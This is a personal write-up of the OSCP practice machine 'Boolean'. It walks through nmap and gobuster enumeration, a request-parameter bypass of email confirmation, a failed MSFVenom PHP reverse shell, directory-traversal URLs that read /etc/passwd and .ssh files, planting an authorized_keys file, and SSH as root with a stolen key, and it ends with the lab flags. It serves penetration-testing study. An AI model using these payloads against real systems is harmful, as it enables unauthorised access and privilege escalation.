---
title: OSCP - Boolean - Linux
created: 2026-01-26
updated: 2026-01-22
status: seed
draft: false
tags:
  - cyber-security
related: "[[Cyber Security]]"
---
# Boolean
This was an absolute slog, and even the walkthroughs didn't help at the end. It was good to identify that BurpSuite would be used early on, but picking up and changing the "confirmed" element was tricky. Having the PHP reverse shell not work was incredibly frustrating too, but it was obvious something else would be needed when GoBuster wasn't showing where the uploaded files were being stored (obviously download only and not directly web accessible).

The real challenge here was figuring out the SSH keys. It's not something I've done a lot with so far, so figuring out how to generate them, renaming them `authorized_keys`, and uploading the correct one (public not private) was a challenge in itself. The truly frustrating part came from trying to switch to `root@127.0.0.1` and being told there'd been too many authentication failures. A little more research showed that it could be bypassed with the `-o IdentitesOnly=yes` option, but after so much frustration trying to sort the keys in the first place, I probably should have just walked away for awhile and come back to find answers instead of getting more frustrated.

On the plus side though, this box helped me sort out a lot of my internal notes so that they would be better used as cheat sheets in the future. Going through these boxes is certainly helping imbed the lessons I learned from the modules, so keep doing the boxes, keep taking notes, and keep refining your processes. 
# Resolution summary
- Nmap to find port 22, 80 & 3000
- Navigated to HTML site, registered user, used BurpSuite Repeater to bypass email authentication
- Uploaded PHP to attempt reverse shell but no success
- Used directory traversal to view `/etc/passwd` & identify user `remi`
- Used directory traversal to access `/home/remi/.ssh` and upload SSH key
- Used SSH to login as `remi` and print `local.txt`
- Navigated to `/home/remi/.ssh/keys` to find `root` SSH key
- Used `root` SSH key to switch to `root` user and print `proof.txt`
## Improved skills
- Generating and handling SSH keys, especially adding `-o IdentitesOnly=yes` and switching internally with `127.0.0.1`
- Identifying vulnerabilities with BurpSuite
## Used tools
- nmap
- BurpSuite Repeater
- MSFVenom
- SSH

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN boolean.nmap 192.168.137.231 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp   open   http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-title: Boolean
|_Requested resource was http://192.168.137.231/login
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
3000/tcp closed ppp
1 service unrecognized despite returning data.
```

---
# Enumeration

## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 80 - HTTP
- Navigated to `http://192.168.137.231`, redirected to `http://192.168.137.231/login`
![OSCP Boolean Linux Image1](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image1.png)
- Ran `gobuster` to enumerate directories: `gobuster dir -u  http://192.168.137.231 -w //usr/share/dirb/wordlists/big.txt`
![OSCP Boolean Linux Image2](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image2.png)
- Used `gobuster` to further enumerate `filemaneger` directory with no results
![OSCP Boolean Linux Image3](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image3.png)

---
# Exploitation
- Created user with credentials `offsec:password` & email `offsec@offsec.com`
![OSCP Boolean Linux Image4](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image4.png)
- Presented with email confirmation page, so tried changing email to `kali@offsec.com` & inspected request in Burpsuite, identifying `"confirmed":false,` in response
![OSCP Boolean Linux Image5](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image5.png)
- Modified request to include `&user%5Bconfirmed=True` and bypassed email confirmation
Request (Burpsuite)
![OSCP Boolean Linux Image6](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image6.png)
Response (Browser)
![OSCP Boolean Linux Image7](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image7.png)
- Identified upload facility, so created reverse shell with MSFVenom
![OSCP Boolean Linux Image8](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image8.png)
- Successfully uploaded shell.php to target
![OSCP Boolean Linux Image9](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image9.png)
- File path: `http://192.168.137.231/?cwd=&file=shell.php&download=true`
- Modified file path to `http://192.168.137.231/?cwd=&file=shell.php` - No change or shell established
- Attempted directory traversal to `/etc/passwd` file: `http://192.168.137.231/?cwd=../../../../../../../../../etc/&file=passwd&download=true`
![OSCP Boolean Linux Image10](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image10.png)
- Identified user `remi`, and attempted to access user's `.ssh` directory: `http://192.168.137.231/?cwd=../../../../../../../home/remi&file=.ssh&download=true`
![OSCP Boolean Linux Image11](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image11.png)
- Identified `local.txt` and accessed `.ssh/keys`
![OSCP Boolean Linux Image12](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image12.png)
- Downloaded `root`, `id_rsa`, `id_rsa.1`, `id_rsa.2` SSH keys & attempted to crack password
![OSCP Boolean Linux Image13](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image13.png)![OSCP Boolean Linux Image14](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image14.png)
- Used `ssh-keygen` to generate an authorized key
![OSCP Boolean Linux Image15](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image15.png)
- Uploaded newly generated key `authorized_keys` to target
![OSCP Boolean Linux Image16](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image16.png)
- Used newly generated SSH key to login as `remi` user
![OSCP Boolean Linux Image17](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image17.png)
---
# Lateral Movement to user
## Local Enumeration
- Found and printed `local.txt` = `c31ba66829a7cf0167219e30ea8d0f4f`
---
# Privilege Escalation
## Privilege Escalation vector
- Navigated to previously identified `/.ssh/keys` to find `root` SSH key
![OSCP Boolean Linux Image18](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image18.png)
- Used SSH to switch to `root`: `ssh -i root root@127.0.0.1 -o IdentitiesOnly=yes`
![OSCP Boolean Linux Image19](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image19.png)
- Navigated to `/root` to find `proof.txt`
![OSCP Boolean Linux Image20](/images/OSCP%20-%20Boolean%20-%20Linux%20-%20image20.png)
---
# Trophy & Loot
`local.txt` = `c31ba66829a7cf0167219e30ea8d0f4f`
`root.txt` = `bc3be029a2e748ca228d49e7270d7a78`

